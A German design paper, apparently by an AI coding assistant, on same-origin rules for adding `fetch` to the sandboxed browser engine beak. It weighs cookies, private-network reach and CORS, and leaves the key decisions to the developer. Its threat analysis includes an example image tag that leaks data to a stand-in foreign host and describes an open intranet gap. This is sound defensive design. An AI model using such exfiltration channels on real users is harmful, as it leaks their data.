# `fetch` und die Herkunftsfrage — Entscheidungspapier

**Stand 2026-09-05, beak 0.100.0.** Ausgelöst von Florian: *„fang mit fetch
an — erst das Papier zur Same-Origin-Frage."*

Ein Skript in beak kann heute **nichts** aus dem Netz holen: `fetch`,
`XMLHttpRequest`, `WebSocket` und `EventSource` fehlen alle vier. Das ist der
Riegel vor jeder dynamischen Seite. Bevor eine Zeile davon gebaut wird, muss
entschieden sein, **wer wen wovor schützt** — sonst wird die Regel später
nachgerüstet, und nachgerüstete Grenzen sind keine.

`docs/spec/BROWSER.md` §4 sagt bereits: *„Same-origin policy + no local-file
scheme enforced in `net.rs`, above the capability."* Das ist eine Absicht,
kein Entwurf. Dieses Papier soll sie zu einem machen.

---

## 1. Was heute WIRKLICH gilt — gemessen, nicht angenommen

Bevor man eine Grenze zieht, muss man wissen, wo die alte liegt. Alles hier
ist am Code nachgelesen (`tools/wasm/beak/src/lib.rs`,
`kernel/src/intent/http.rs`), nicht erinnert.

| Weg | fremde Herkunft? | Kekse dabei? | Antwort für Skript lesbar? |
|---|---|---|---|
| Navigation (Adresszeile, Link) | ja | **ja** (`cookies::header_for`, Zeile 932) | — |
| `<link rel=stylesheet>` | ja, ungeprüft | **nein** | nein |
| `<script src>` | ja, ungeprüft | **nein** | — (läuft aber) |
| `<img src>`, CSS-`url()` | ja, ungeprüft | **nein** | nein |
| Formular-Absenden | ja, ungeprüft | ja (Navigation) | — |
| **`fetch` aus einem Skript** | **gibt es nicht** | — | — |

Daraus folgen vier Feststellungen, und die dritte ist die wichtige:

1. **Eine Seite kann beak heute schon zu GETs an beliebige Hosts bringen.**
   `<img src="https://fremd/?daten">` ist ein Ausleitungskanal, und er ist
   offen. `fetch` erfindet ihn nicht.
2. **`<script src>` von fremder Herkunft wird geholt UND ausgeführt**, in
   derselben Umgebung wie das Seitenskript. Das ist die grösste bestehende
   Vertrauensfläche, grösser als alles, was `fetch` hinzufügt.
3. **Unterressourcen fahren OHNE Kekse.** Nur die Navigation hängt sie an.
   beak ist damit heute **strenger als jeder normale Browser** — es gibt
   keine mitreisende Vollmacht (*ambient authority*) auf Unterressourcen.
   **Das ist der Grund, warum wir die Regel des Webs nicht übernehmen
   müssen** (§2).
4. **Es gibt gar keinen Schutz vor dem eigenen Netz.** Private Adressen
   kommen im Kernel an genau einer Stelle vor — und dort als *Erlaubnis*,
   nicht als Sperre: `plain_http_allowed()` (`http.rs:2129`) lässt
   Klartext-HTTP **nur** an 10/8, 172.16/12, 192.168/16, 127/8 und
   169.254/16 durch, und auch das nur mit dem Schalter
   `net.allow_plain_http=1`. Für `https://` wird die Funktion nie gefragt
   (einziger Aufruf: `http.rs:2094`, im `http://`-Zweig).
   **`https://192.168.1.1` ist damit heute völlig unbeschränkt**, auch als
   Unterressource einer fremden Seite. Der Kommentar bei der Funktion
   benennt das Restrisiko für den Klartextfall bereits — für den
   TLS-Fall steht es nirgends. Offene Lücke, unabhängig von `fetch`,
   eigener Posten in §5.

---

## 2. Warum Same-Origin nicht einfach importiert wird

Die Regel des Webs ist keine Naturkonstante, sie ist die Antwort auf eine
Eigenschaft, die Browser haben und wir nicht:

> Ein Browser hängt Anmeldedaten **automatisch** an jede Anfrage an ihre
> Herkunft. Damit ist jede Anfrage eine Handlung *im Namen des angemeldeten
> Nutzers* — und deshalb muss der Browser einschränken, wer die ANTWORT
> lesen darf. Sonst liest `evil.com` per Skript das Postfach mit.

Same-Origin ist also die Reparatur einer mitreisenden Vollmacht. **Wir haben
diese Vollmacht auf Unterressourcen gar nicht** (§1.3) — wir stehen vor der
Reparatur und dürfen die Ursache vermeiden, statt sie nachzubauen.

Genau das ist Architekturprinzip 1: *Capabilities, not Permissions.* Eine
Berechtigung fragt „darf dieser Aufrufer?"; eine Kapabilität *ist* die
Erlaubnis und reist nicht von selbst mit.

**Same-Origin vermischt zwei Schutzziele, und sie fallen bei uns
auseinander:**

| | wovor | trifft uns? |
|---|---|---|
| **A — fremde Daten lesen** | Skript liest eine Antwort, die nur wegen der Vollmacht des Nutzers zustande kam | **nur, wenn wir Kekse mitschicken.** Tun wir nicht → entfällt |
| **B — Reichweite** | Seite erreicht Ziele, die ihr Absender selbst nicht erreicht: Intranet, `localhost`, Gerätedienste | **ja, voll.** beak steht IM Netz des Nutzers |
| **C — Ausleitung** | Seite schickt Daten hinaus | **ja — aber schon heute offen** (§1.1) |

**A ist die Frage, die CORS beantwortet, und sie ist bei uns fast leer.**
B ist die, die wirklich weh tut, und CORS beantwortet sie *nicht*.
C ist nicht neu und lässt sich mit `fetch` nicht schlechter machen.

Das dreht die übliche Reihenfolge um: nicht „CORS einbauen, dann sind wir
sicher", sondern **„Vollmacht nie mitreisen lassen, Reichweite hart
begrenzen — und CORS nur dort, wo es dem ZIELserver dient."**

---

## 3. Vorschlag für v1

Fünf Regeln. Sie stehen bewusst **im Kernel** (`intent/http.rs`), nicht in
beak: eine Grenze, die das sandkastenbewohnende Modul selbst zieht, ist
keine. beak darf sie verschärfen, nie lockern.

### R1 — Keine mitreisende Vollmacht. Nie.

`fetch` schickt **keine Kekse**, in keinem Fall, auch nicht zur eigenen
Herkunft. Kein `credentials: "include"`, kein `"same-origin"` — die Option
wird angenommen und ignoriert, und der Lauf sagt es.

Damit fällt Schutzziel A weg, und mit ihm der grösste Teil von CORS.

*Preis, benannt:* eine angemeldete Seite kann ihre eigene API nicht per
Skript abfragen. Für claude.ai heisst das: **so wird man sich nicht
einloggen können.** Das ist der Punkt, an dem v2 entscheiden muss, ob es
eine *ausdrücklich erteilte, sichtbare* Keks-Kapabilität je Herkunft gibt —
siehe §5. v1 baut sie nicht, weil eine Vollmacht, die man einmal einbaut,
schwer wieder eingesammelt wird.

### R2 — Reichweite ist eine Kapabilität, kein Zufall

Verboten, unabhängig von Schema und Herkunft:

* private Adressbereiche (10/8, 172.16/12, 192.168/16, 127/8, 169.254/16,
  `::1`, `fc00::/7`) — **auch über `https://`**, was heute die Lücke ist
* jedes Schema ausser `https://` (`file:`, `npk:`, `data:` als
  Anfrageziel, `blob:`, `about:`)
* die eigene Wirtsschnittstelle in jeder Schreibweise

Geprüft wird an der **aufgelösten Adresse**, nicht am Namen — sonst hebelt
ein DNS-Eintrag, der beim zweiten Auflösen woanders hinzeigt, die Regel aus.
Der Kommentar bei `plain_http_allowed` (`http.rs:2116`) hat das schon
aufgeschrieben; es gibt die Regel nur noch nicht. Sie ist **neu zu bauen**,
nicht zu verschieben: die vorhandene Adressliste ist eine Erlaubnisliste mit
umgekehrtem Vorzeichen (§1.4) und lässt sich nicht einfach umdrehen.

### R3 — Fremde Herkunft: schicken ja, lesen nur mit Zustimmung des Ziels

* **Gleiche Herkunft** (Schema + Host + Port, exakt): Antwort lesbar.
* **Fremde Herkunft:** Anfrage geht raus, Antwort ist für das Skript
  **undurchsichtig** — Status und Körper nicht lesbar, das Versprechen löst
  mit einer leeren Antwort auf.
* Ausnahme: das Ziel sagt `Access-Control-Allow-Origin: <unsere Herkunft>`
  oder `*`. Dann ist die Antwort lesbar.

Das ist der *kleine* Teil von CORS und der einzige, der bei uns etwas tut —
er dient dem **Zielserver**, der bestimmen darf, wer seine Antworten liest.
Ohne Kekse (R1) ist `*` dabei ungefährlich.

**Ausdrücklich NICHT in v1:** Vorabanfragen (`OPTIONS` preflight),
`Access-Control-Allow-Credentials`, `-Expose-Headers`, `-Max-Age`. Die
gehören alle zur Vollmachts-Reparatur, die wir nicht brauchen. Solange R4
gilt, kann keine Anfrage entstehen, die eine Vorabanfrage rechtfertigen
würde.

### R4 — Nur einfache Anfragen

`GET`, `HEAD`, `POST`. Kopfzeilen nur aus einer Positivliste
(`Accept`, `Accept-Language`, `Content-Type` mit den drei einfachen Werten,
`Content-Length`). Kein `Authorization`, kein `Cookie`, kein `Referer` von
Hand, keine `X-`-Kopfzeilen.

Damit ist jede `fetch`-Anfrage etwas, das ein Formular auch hätte auslösen
können — also nichts, was die Reichweite über §1 hinaus vergrössert.

### R5 — Deckel, und sie sagen es

Gleichzeitige Anfragen je Dokument, Gesamtbytes, Umleitungstiefe (mit
erneuter R2/R3-Prüfung **je Sprung**, nicht nur am Anfang). Jeder erreichte
Deckel wird geloggt, nicht verschwiegen — sonst sieht die nächste Sitzung
einen Fehler in der Engine, wo ein Deckel steht.

---

## 4. Was das für die drei Ziele heisst

* **github.com** — `fetch` ist hier nicht die Wand; es fehlen Custom
  Elements, echte `scrollHeight/Width`, `MutationObserver`, `pushState`.
  R1 stört nicht, weil die Darstellung ohne angemeldete API-Abfragen
  auskommt.
* **google.ch** — unberührt. Gemessen 2026-09-05: die Sperrseite kommt auch
  mit voller Chrome-Kennung, es ist keine Funktionslücke
  (`memory/project_beak_search_engines.md`).
* **claude.ai** — `fetch` mit strömendem Körper ist die erste
  Voraussetzung, aber **R1 verhindert das Anmelden**. Ohne die
  Keks-Kapabilität aus §5 bleibt es bei „lädt und rendert", nicht
  „chattet". Das ist eine bewusste Reihenfolge: erst die Grenze, dann die
  Tür.

---

## 5. Offene Entscheidungen — die gehören Florian, nicht mir

1. **Gibt es je eine Keks-Kapabilität für `fetch`?** Ohne sie ist keine
   angemeldete Seite bedienbar; mit ihr kommt die mitreisende Vollmacht
   zurück, und mit ihr die halbe CORS-Maschinerie. Ein Mittelweg wäre
   *je Herkunft, sichtbar erteilt, jederzeit sichtbar entziehbar* — also
   eine echte Kapabilität statt einer Einstellung. **Das ist die
   eigentliche Frage dieses Papiers.**
2. **Es gibt keinen Intranet-Riegel (§1.4)** — auch nicht für die Wege, die
   heute schon offen sind (`<img src="https://192.168.1.1/…">`). Das ist
   unabhängig von `fetch` und schon jetzt wahr. Jetzt schliessen oder in
   derselben Runde?
3. **Fremde `<script src>` laufen ungeprüft** (§1.2). Das ist die grösste
   bestehende Fläche. Eigenes Thema, aber es macht die `fetch`-Regeln
   teilweise symbolisch, solange es steht.
4. **Strömende Antworten** (`ReadableStream`) brauchen einen Weg, der die
   Bytes stückweise reicht. `npk_http_poll`/`take` ist bereits so geformt —
   aber es liefert heute *fertige* Antworten. Das ist der eigentliche
   Bauaufwand von `fetch`, nicht die Regel.

---

## 6. Sicherheitsprüfung (CLAUDE.md)

> „Kann ein WASM-Modul durch diese Änderung aus seinem Sandkasten
> ausbrechen?"

**Nein — und die Prüfung greift diesmal eine Ebene tiefer.** Die Sandkasten-
grenze bewegt sich nicht: `fetch` ist eine Bindung auf bestehende
Wirtsaufrufe (`npk_http_begin/poll/take/cancel`), kein neuer Weg nach
draussen. Die Frage, die dieses Papier stellt, ist die zweite:
**kann SEITENcode etwas erreichen, was er nicht soll?** Dafür stehen R1–R5,
und sie stehen im Kernel, weil eine Grenze, die das Modul selbst zieht,
keine ist ([[feedback-sandbox-protects-kernel-not-decision]]).

---

## 7. Wie geprüft wird, bevor gebaut wird

Kein Fix vor der Karte. Was vor der ersten Zeile steht:

* eine Probe je Regel, gegen einen echten Motor gegengeprüft, wo es geht
* die R2-Liste **an aufgelösten Adressen** gefahren, nicht an Namen
* eine Prüfseite in `beak:selftest`, die die Absagen als *bestandene* Zeilen
  zählt — eine verweigerte Anfrage muss grün sein, nicht still

---

*Wenn §5.1 entschieden ist, kann gebaut werden. Vorher nicht: die
Keks-Frage bestimmt, ob R3 die kleine oder die grosse CORS-Maschinerie
braucht, und das ist kein Detail, das man nachträglich umdreht.*
